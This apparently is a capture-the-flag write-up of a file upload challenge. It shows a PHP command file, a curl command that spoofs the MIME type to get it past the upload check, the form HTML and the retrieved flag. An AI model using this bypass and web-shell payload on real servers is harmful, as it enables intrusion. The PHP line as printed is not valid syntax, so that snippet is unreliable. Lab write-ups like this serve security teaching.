# **Description:**

The challenge presented an image upload form that only accepted image files. The goal was to bypass the restriction and upload a PHP file to execute arbitrary commands on the server.

## **Vulnerability:**

The file upload feature did not properly validate MIME types on the server side, allowing an attacker to spoof the content type and upload non-image files.

## **Exploitation:**

### `Crafting the Malicious File:`
A PHP file was created with the following content:
```
<?php exec "ls" ?>
```
This command lists the contents of the directory upon execution.

### `Bypassing MIME Type Restrictions:`
To upload the PHP file while bypassing the restriction, the MIME type was changed using the `curl` command:
```
curl -X POST -F "Upload=Upload" -F "uploaded=@file.php;type=image/jpeg" "http://10.11.100.245/index.php?page=upload"
```
By setting the file type to `image/jpeg`, the server accepted the PHP file as an image.

### `Upload Form Analysis:`
The upload form on the website:
```
<form enctype="multipart/form-data" action="#" method="POST">
    <input type="hidden" name="MAX_FILE_SIZE" value="100000" />
    Choose an image to upload:  <br />
    <input name="uploaded" type="file" /><br />
    <br />
    <input type="submit" name="Upload" value="Upload">
</form>
```
This form allows file uploads but does not enforce server-side verification of the file type beyond what the browser reports.

### `Flag Retrieval:`
After executing the `curl` command, the server responded with an HTML page containing the flag:
```
<pre><center><h2 style="margin-top:50px;">The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center>
```
The flag `46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8` was successfully extracted.
